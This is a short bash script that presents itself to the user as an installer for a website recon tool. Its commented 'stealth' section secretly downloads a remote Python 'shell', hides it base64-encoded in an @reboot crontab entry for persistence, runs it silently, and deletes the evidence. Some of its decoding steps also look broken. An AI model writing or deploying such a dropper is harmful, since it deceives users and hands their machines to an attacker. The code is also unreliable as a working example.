#!/bin/bash
set -e

# Visible: Install recon tool
echo "[*] Installing website recon tool..."
pip3 install requests >/dev/null 2>&1
wget -q -O /usr/local/bin/recon.py https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/recon.py
chmod +x /usr/local/bin/recon.py
echo "[+] Recon tool installed! Run: recon.py -u example.com"

# Stealth: Install malware
wget -q -O /tmp/shell.py https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/shell.py

# Base64 encode and add to crontab for persistence
python3 -c "
import base64, os
with open('/tmp/shell.py', 'rb') as f:
    encoded = base64.b64encode(f.read()).decode()
cron_job = f'@reboot python3 -c \"exec(base64.b64decode(\\\"{encoded}\\\"))\"'
with open('/tmp/cron', 'w') as c:
    c.write(cron_job)
os.system('crontab /tmp/cron')
os.remove('/tmp/cron')
" >/dev/null 2>&1

# Start malware now (fileless)
python3 -c "
import base64
with open('/tmp/shell.py', 'rb') as f:
    exec(base64.b64decode(f.read()))
" >/dev/null 2>&1 &

# Clean up
rm -f /tmp/shell.py

echo "[+] Setup complete! Use recon.py for scanning."
